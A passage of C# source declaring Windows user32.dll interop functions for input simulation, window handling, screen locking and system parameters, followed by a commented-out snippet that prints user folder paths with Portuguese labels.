        static extern bool SetLayeredWindowAttributes(IntPtr hwnd, uint crKey, byte bAlpha, uint dwFlags);


        [DllImport("user32.dll")]
        public static extern bool LockWorkStation();

        [DllImport("user32.dll")]
        public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);


        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);


        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetWindowText(IntPtr hWnd, string lpString);

        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);

        [DllImport("user32.dll")]
        public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);


        [StructLayout(LayoutKind.Sequential)]
        struct INPUT
        {
            public uint type;
            public MOUSEINPUT mi;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct MOUSEINPUT
        {
            public int dx;
            public int dy;
            public uint mouseData;
            public uint dwFlags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

        private const uint INPUT_MOUSE = 0;
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;

        //----------
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SendMessage(IntPtr a, uint b, IntPtr c, IntPtr d);


        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    }
}
/*


Console.WriteLine("Área de trabalho: " + Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
Console.WriteLine("Documentos: " + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
Console.WriteLine("Aplicativos: " + Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));


 
 */